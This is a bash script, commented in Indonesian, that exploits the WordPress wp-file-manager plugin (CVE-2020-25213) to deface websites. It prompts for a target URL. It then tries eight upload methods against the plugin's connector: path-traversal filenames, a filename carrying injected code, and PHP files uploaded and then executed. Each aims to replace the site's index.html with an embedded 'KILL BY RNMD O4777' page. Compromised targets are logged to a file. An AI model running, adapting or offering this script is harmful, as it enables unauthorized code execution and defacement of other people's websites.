#!/bin/bash

# -------------------------------
# WP FILE MANAGER EXPLOIT - KILL BY RNMD O4777
# [ Khusus untuk wp-file-manager plugin ]
# -------------------------------

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# HTML Content
HTML_CONTENT='<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KILL BY RNMD O4777 · WEB ERROR</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #0b0c0e;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: '"'"'Courier New'"'"', Courier, '"'"'Fira Code'"'"', monospace;
            padding: 1rem;
        }

        .error-terminal {
            background: #030405;
            background-image: radial-gradient(rgba(20, 90, 50, 0.15) 1px, transparent 1px);
            background-size: 32px 32px;
            border: 3px solid #2e8b57;
            box-shadow: 0 0 25px #1b4b3b, 0 0 5px #0f2f22 inset, 0 0 15px #1b4b3b;
            max-width: 820px;
            width: 100%;
            padding: 2rem 2rem 2.5rem 2rem;
            border-radius: 28px 28px 24px 24px;
            position: relative;
            transition: all 0.2s ease;
        }

        .error-terminal::before {
            content: "";
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
            background: repeating-linear-gradient(0deg, rgba(0, 30, 10, 0.1) 0px, rgba(0, 255, 100, 0.02) 2px, transparent 3px, transparent 5px);
            pointer-events: none;
            border-radius: 24px;
            z-index: 2;
        }

        .header-tab {
            display: flex;
            gap: 1.2rem;
            align-items: center;
            border-bottom: 2px solid #1f5f3f;
            padding-bottom: 0.8rem;
            margin-bottom: 2rem;
            flex-wrap: wrap;
        }

        .dot-group {
            display: flex;
            gap: 10px;
        }

        .dot {
            width: 18px;
            height: 18px;
            border-radius: 50%;
            background: #202420;
            box-shadow: inset 0 2px 3px #0f1f0f, 0 0 8px #2e8b57;
        }

        .dot.red {
            background: #3a1f1f;
            box-shadow: inset 0 1px 4px #5a2e2e, 0 0 10px #a13b3b;
        }

        .dot.green {
            background: #1e3a1e;
            box-shadow: inset 0 1px 4px #2b6e2b, 0 0 12px #30b530;
        }

        .title-blink {
            color: #9fff9f;
            font-size: 1.3rem;
            font-weight: bold;
            letter-spacing: 3px;
            text-shadow: 0 0 5px #21fc9f, 0 0 12px #1b7a47;
            margin-left: auto;
            border: 1px dashed #2e6b4b;
            padding: 0.3rem 1rem;
            background: #0d1f13;
            text-transform: uppercase;
        }

        .kill-core {
            background: #0d130f;
            border: 3px ridge #2caf6b;
            padding: 2rem 1.8rem;
            margin: 1.5rem 0 1.8rem 0;
            position: relative;
            box-shadow: inset 0 0 30px #071007, 0 0 30px #1b4f33;
        }

        .kill-core pre {
            color: #a0f0b0;
            font-size: clamp(2.2rem, 12vw, 5.3rem);
            font-weight: 800;
            line-height: 1.1;
            text-align: center;
            font-family: '"'"'Courier New'"'"', '"'"'Fira Code'"'"', monospace;
            text-shadow: 0 0 6px #26ff9b, 0 0 20px #1f9f5a;
            letter-spacing: 6px;
            margin: 0;
            word-break: break-word;
            white-space: pre-wrap;
        }

        .kill-core pre span.glitch {
            display: inline-block;
            animation: glitch-twitch 2.2s infinite steps(1);
            filter: drop-shadow(0 0 8px #0f6);
        }

        .sub-line {
            color: #8fd9b0;
            font-size: 1.8rem;
            text-align: right;
            border-top: 2px solid #1d5f3a;
            padding-top: 0.7rem;
            margin-top: 0.5rem;
            text-transform: uppercase;
            font-weight: 600;
            word-break: break-word;
            text-shadow: 0 0 4px #2ecc71;
        }

        .error-foot {
            background: #0b150e;
            padding: 1.3rem 1.5rem;
            border-left: 12px solid #1f5f37;
            margin: 2.2rem 0 1rem 0;
            display: flex;
            flex-wrap: wrap;
            align-items: baseline;
            justify-content: space-between;
            gap: 1.2rem;
            border-radius: 0 18px 18px 0;
            box-shadow: -5px 0 15px #0d4229;
        }

        .error-code {
            font-size: 2.5rem;
            font-weight: bold;
            color: #e05f5f;
            text-shadow: 0 0 9px #f33, 0 0 18px #a00;
            letter-spacing: 8px;
            background: #1f1212;
            padding: 0.2rem 1rem;
            border-radius: 30px;
            display: inline-block;
        }

        .error-meta {
            color: #44c97a;
            font-size: 1.2rem;
            background: #0f1f17;
            padding: 0.5rem 1.3rem;
            border-radius: 40px;
            border: 1px solid #258b5c;
            text-transform: uppercase;
            letter-spacing: 3px;
        }

        .cursor-block {
            display: flex;
            gap: 0.5rem;
            align-items: center;
            margin-top: 1.2rem;
            color: #44b874;
            font-size: 1.3rem;
            border-left: 4px solid #278f5a;
            padding-left: 1.2rem;
        }

        .cursor {
            background: #2e8b57;
            width: 22px;
            height: 22px;
            display: inline-block;
            animation: blink 1s step-end infinite;
            box-shadow: 0 0 18px #0f6;
        }

        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0; }
        }

        @keyframes glitch-twitch {
            0% { transform: skew(0deg, 0deg); opacity: 1; }
            9% { transform: skew(3deg, -2deg); text-shadow: 3px 0 2px #0f0, -3px 0 2px red; }
            10% { transform: skew(0deg, 0deg); text-shadow: none; }
            29% { transform: skew(-2deg, 1deg); }
            30% { transform: none; }
            69% { transform: skew(5deg, -1deg); text-shadow: -1px 0 0 #0f0, 1px 0 0 red; }
            70% { transform: none; text-shadow: none; }
            100% { transform: none; }
        }

        .kill-core pre span {
            display: inline-block;
        }

        @media (max-width: 500px) {
            .error-terminal {
                padding: 1.5rem 1rem;
            }
            .kill-core pre {
                font-size: 2.4rem;
                letter-spacing: 2px;
            }
            .sub-line {
                font-size: 1.2rem;
            }
            .error-code {
                font-size: 1.8rem;
                letter-spacing: 4px;
            }
        }
    </style>
</head>
<body>
    <div class="error-terminal">
        <div class="header-tab">
            <div class="dot-group">
                <div class="dot red"></div>
                <div class="dot green"></div>
                <div class="dot"></div>
            </div>
            <div class="title-blink">⚠️ KERNEL PANIC ⚠️</div>
        </div>

        <div class="kill-core">
            <pre>
<span class="glitch">KILL BY</span> <span class="glitch" style="animation-delay:0.1s;">RNMD</span> <span style="color:#70ecb0; text-shadow:0 0 25px #3aff9f;">O4777</span>
            </pre>
            <div class="sub-line">:: SYSTEM HALT ::</div>
        </div>

        <div class="error-foot">
            <span class="error-code">WEB - ERROR</span>
            <span class="error-meta">0x4777::RNMD</span>
        </div>

        <div class="cursor-block">
            <span class="cursor"></span>
            <span> [FATAL: KILL_SIGNAL_RECEIVED] </span>
            <span style="margin-left: auto; color:#62cc8b;">O4777_CRIT</span>
        </div>

        <div style="color: #164d2b; font-size: 0.8rem; margin-top: 1.5rem; text-align: center; border-top: 1px dashed #226f3f; padding-top: 0.6rem;">
            <span style="background:#0b1f13; padding:0 0.8rem;">❯❯  KILL BY RNMD O4777  ❮❮</span>
        </div>
    </div>
</body>
</html>'

# Header
clear
echo -e "${RED}"
echo "    ╔═══════════════════════════════════════════════════════════╗"
echo "    ║     WP FILE MANAGER EXPLOIT - KILL BY RNMD O4777         ║"
echo "    ║     [ CVE-2020-25213 Exploit ]                           ║"
echo "    ╚═══════════════════════════════════════════════════════════╝"
echo -e "${NC}"

echo -e "${CYAN}╔════════════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║            ENTER TARGET URL                    ║${NC}"
echo -e "${CYAN}╚════════════════════════════════════════════════╝${NC}"
echo ""

echo -ne "${WHITE}Target WordPress URL : ${NC}"
read TARGET_URL

TARGET_URL=$(echo "$TARGET_URL" | sed 's/\/$//')

echo -e "\n${YELLOW}[•] Target: $TARGET_URL${NC}"
echo -e "${YELLOW}[•] Plugin: wp-file-manager${NC}"
echo -e "${YELLOW}[•] CVE: 2020-25213${NC}\n"

# ==============================================
# EXPLOIT FILE MANAGER - MULTIPLE METHODS
# ==============================================

FM_BASE="$TARGET_URL/wp-content/plugins/wp-file-manager"
FM_CONNECTOR="$FM_BASE/lib/php/connector.minimal.php"

# Cek ketersediaan plugin
echo -e "${YELLOW}[•] Checking File Manager plugin...${NC}"
CHECK=$(curl -s -k -o /dev/null -w "%{http_code}" "$FM_CONNECTOR" --max-time 5)

if [ "$CHECK" != "200" ] && [ "$CHECK" != "403" ]; then
    echo -e "${RED}❌ File Manager plugin tidak ditemukan!${NC}"
    exit 1
fi

echo -e "${GREEN}✅ File Manager plugin ditemukan!${NC}"

# Method 1: Direct upload via connector
echo -e "\n${YELLOW}[•] Method 1: Direct file upload via connector...${NC}"

BOUNDARY="---------------------------$(date +%s%N)"
FILENAME="index.html"
FILEPATH="/var/www/html/index.html"

# Payload untuk upload file
UPLOAD_DATA="--$BOUNDARY\r\n"
UPLOAD_DATA+="Content-Disposition: form-data; name=\"upload[]\"; filename=\"$FILENAME\"\r\n"
UPLOAD_DATA+="Content-Type: text/html\r\n\r\n"
UPLOAD_DATA+="$HTML_CONTENT\r\n"
UPLOAD_DATA+="--$BOUNDARY--\r\n"

RESPONSE=$(curl -s -k -X POST "$FM_CONNECTOR" \
    -H "Content-Type: multipart/form-data; boundary=$BOUNDARY" \
    -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64)" \
    --data-binary "$UPLOAD_DATA" \
    --max-time 10 2>/dev/null)

if [[ "$RESPONSE" == *"added"* ]] || [[ "$RESPONSE" == *"success"* ]]; then
    echo -e "${GREEN}✅ Upload sukses via Method 1!${NC}"
else
    echo -e "${RED}❌ Method 1 gagal${NC}"
fi

# Method 2: Command injection via filename
echo -e "\n${YELLOW}[•] Method 2: Command injection via filename...${NC}"

# Filename dengan command injection
INJECT_FILENAME="';file_put_contents('index.html','$HTML_CONTENT');'"
INJECT_FILENAME=$(echo "$INJECT_FILENAME" | sed 's/ /%20/g')

UPLOAD_DATA="--$BOUNDARY\r\n"
UPLOAD_DATA+="Content-Disposition: form-data; name=\"upload[]\"; filename=\"$INJECT_FILENAME\"\r\n"
UPLOAD_DATA+="Content-Type: text/html\r\n\r\n"
UPLOAD_DATA+="test\r\n"
UPLOAD_DATA+="--$BOUNDARY--\r\n"

RESPONSE=$(curl -s -k -X POST "$FM_CONNECTOR" \
    -H "Content-Type: multipart/form-data; boundary=$BOUNDARY" \
    --data-binary "$UPLOAD_DATA" \
    --max-time 10 2>/dev/null)

echo -e "${YELLOW}⚠️  Command injection attempt sent${NC}"

# Method 3: Path traversal untuk overwrite index.html
echo -e "\n${YELLOW}[•] Method 3: Path traversal upload...${NC}"

TRAVERSAL_FILENAME="../../../../index.html"

UPLOAD_DATA="--$BOUNDARY\r\n"
UPLOAD_DATA+="Content-Disposition: form-data; name=\"upload[]\"; filename=\"$TRAVERSAL_FILENAME\"\r\n"
UPLOAD_DATA+="Content-Type: text/html\r\n\r\n"
UPLOAD_DATA+="$HTML_CONTENT\r\n"
UPLOAD_DATA+="--$BOUNDARY--\r\n"

RESPONSE=$(curl -s -k -X POST "$FM_CONNECTOR" \
    -H "Content-Type: multipart/form-data; boundary=$BOUNDARY" \
    --data-binary "$UPLOAD_DATA" \
    --max-time 10 2>/dev/null)

echo -e "${YELLOW}⚠️  Path traversal attempt sent${NC}"

# Method 4: RCE via file operation
echo -e "\n${YELLOW}[•] Method 4: RCE via file operation...${NC}"

# Coba buat file PHP untuk RCE
PHP_SHELL='<?php file_put_contents("index.html", "'$(echo "$HTML_CONTENT" | base64 -w 0)'"); ?>'

# Upload shell
SHELL_DATA="--$BOUNDARY\r\n"
SHELL_DATA+="Content-Disposition: form-data; name=\"upload[]\"; filename=\"shell.php\"\r\n"
SHELL_DATA+="Content-Type: application/php\r\n\r\n"
SHELL_DATA+="$PHP_SHELL\r\n"
SHELL_DATA+="--$BOUNDARY--\r\n"

curl -s -k -X POST "$FM_CONNECTOR" \
    -H "Content-Type: multipart/form-data; boundary=$BOUNDARY" \
    --data-binary "$SHELL_DATA" \
    --max-time 10 >/dev/null 2>&1

# Execute shell
SHELL_URL="$TARGET_URL/wp-content/plugins/wp-file-manager/shell.php"
curl -s -k "$SHELL_URL" --max-time 5 >/dev/null 2>&1

echo -e "${YELLOW}⚠️  RCE attempt sent${NC}"

# Method 5: Direct write via API
echo -e "\n${YELLOW}[•] Method 5: Direct write via API...${NC}"

# Coba akses API endpoint
API_URL="$FM_BASE/lib/php/connector.minimal.php?cmd=upload&target=l1_Lw&upload_path=../../../../index.html"

curl -s -k -X POST "$API_URL" \
    -F "upload[]=@-" <<< "$HTML_CONTENT" \
    --max-time 10 >/dev/null 2>&1

echo -e "${YELLOW}⚠️  API upload attempt sent${NC}"

# Method 6: Bruteforce directory traversal
echo -e "\n${YELLOW}[•] Method 6: Bruteforce directory traversal...${NC}"

for i in {1..10}; do
    TRAVERSAL=$(printf "../../%.0s" $(seq 1 $i))"index.html"
    
    curl -s -k -X POST "$FM_CONNECTOR" \
        -F "cmd=upload" \
        -F "target=l1_Lw" \
        -F "upload[]=@-;filename=$TRAVERSAL" <<< "$HTML_CONTENT" \
        --max-time 5 >/dev/null 2>&1
done

echo -e "${YELLOW}⚠️  Directory traversal bruteforce selesai${NC}"

# ==============================================
# VERIFIKASI HASIL
# ==============================================

echo -e "\n${YELLOW}[•] Memeriksa apakah index.html sudah terganti...${NC}"
sleep 3

CHECK_URL="$TARGET_URL/"
RESPONSE=$(curl -s -k "$CHECK_URL" --max-time 5)

if [[ "$RESPONSE" == *"KILL BY RNMD O4777"* ]]; then
    echo -e "\n${GREEN}╔════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║         ✅  BERHASIL!                           ║${NC}"
    echo -e "${GREEN}║         Index.html sudah terganti               ║${NC}"
    echo -e "${GREEN}║         KILL BY RNMD O4777 aktif!              ║${NC}"
    echo -e "${GREEN}╚════════════════════════════════════════════════╝${NC}"
    
    # Preview
    echo -e "\n${YELLOW}[•] Preview:${NC}"
    echo "$RESPONSE" | grep -E "KILL BY RNMD|O4777|WEB - ERROR" --color=always | head -3
    
    # Save
    echo "$TARGET_URL | KILL BY RNMD O4777 | $(date)" >> rnmd_success.txt
    
    # Buka browser
    echo -ne "\n${YELLOW}Buka browser? (y/n): ${NC}"
    read OPEN
    
    if [[ "$OPEN" == "y" || "$OPEN" == "Y" ]]; then
        xdg-open "$TARGET_URL" 2>/dev/null || open "$TARGET_URL" 2>/dev/null || echo -e "${CYAN}Buka: $TARGET_URL${NC}"
    fi
    
else
    echo -e "\n${RED}╔════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}║         ❌  GAGAL!                              ║${NC}"
    echo -e "${RED}║         Tapi File Manager terdeteksi!           ║${NC}"
    echo -e "${RED}║         Coba metode tambahan...                 ║${NC}"
    echo -e "${RED}╚════════════════════════════════════════════════╝${NC}"
    
    # Method 7: Coba via backup/restore feature
    echo -e "\n${YELLOW}[•] Method 7: Backup/Restore exploit...${NC}"
    
    # Coba buat backup dengan nama spesial
    BACKUP_DATA='<?php
    $content = "'$(echo "$HTML_CONTENT" | base64)'";
    file_put_contents("index.html", base64_decode($content));
    ?>'
    
    curl -s -k -X POST "$FM_CONNECTOR" \
        -F "cmd=upload" \
        -F "upload[]=@-;filename=backup.php" <<< "$BACKUP_DATA" \
        --max-time 5 >/dev/null 2>&1
    
    # Execute backup
    curl -s -k "$TARGET_URL/wp-content/plugins/wp-file-manager/backup.php" --max-time 5 >/dev/null 2>&1
    
    # Method 8: Try to find writable directories
    echo -e "\n${YELLOW}[•] Method 8: Scanning writable directories...${NC}"
    
    DIRS=(
        "/wp-content/uploads/"
        "/wp-content/themes/"
        "/wp-content/plugins/"
        "/wp-admin/"
        "/"
    )
    
    for dir in "${DIRS[@]}"; do
        TEST_FILE="$TARGET_URL${dir}test.txt"
        curl -s -k -X POST "$FM_CONNECTOR" \
            -F "cmd=upload" \
            -F "target=l1_Lw" \
            -F "upload[]=@-;filename=${dir}test.txt" <<< "test" \
            --max-time 5 >/dev/null 2>&1
        
        CHECK_TEST=$(curl -s -k -o /dev/null -w "%{http_code}" "$TEST_FILE" --max-time 5)
        
        if [ "$CHECK_TEST" == "200" ]; then
            echo -e "${GREEN}✅ Writable directory: $dir${NC}"
            
            # Upload ke directory yang writable
            curl -s -k -X POST "$FM_CONNECTOR" \
                -F "cmd=upload" \
                -F "target=l1_Lw" \
                -F "upload[]=@-;filename=${dir}index.html" <<< "$HTML_CONTENT" \
                --max-time 5 >/dev/null 2>&1
        fi
    done
    
    # Final check
    sleep 2
    FINAL_CHECK=$(curl -s -k "$TARGET_URL/" --max-time 5)
    
    if [[ "$FINAL_CHECK" == *"KILL BY RNMD O4777"* ]]; then
        echo -e "\n${GREEN}✅ BERHASIL pada percobaan terakhir!${NC}"
        echo "$TARGET_URL | KILL BY RNMD O4777 | $(date)" >> rnmd_success.txt
    else
        echo -e "\n${YELLOW}⚠️  Masih gagal. File HTML disimpan untuk upload manual:${NC}"
        echo "$HTML_CONTENT" > "kill_by_rnmd_o4777_final.html"
        echo -e "${CYAN}📁 File: kill_by_rnmd_o4777_final.html${NC}"
        echo -e "${CYAN}📤 Upload via FTP atau cPanel ke: /var/www/html/index.html${NC}"
    fi
fi

echo -e "\n${CYAN}════════════════════════════════════════════════════${NC}"
echo -e "${CYAN}🔥 KILL BY RNMD O4777 - EXPLOIT SEQUENCE COMPLETE 🔥${NC}"
echo -e "${CYAN}Telegram: @lynnn046${NC}"
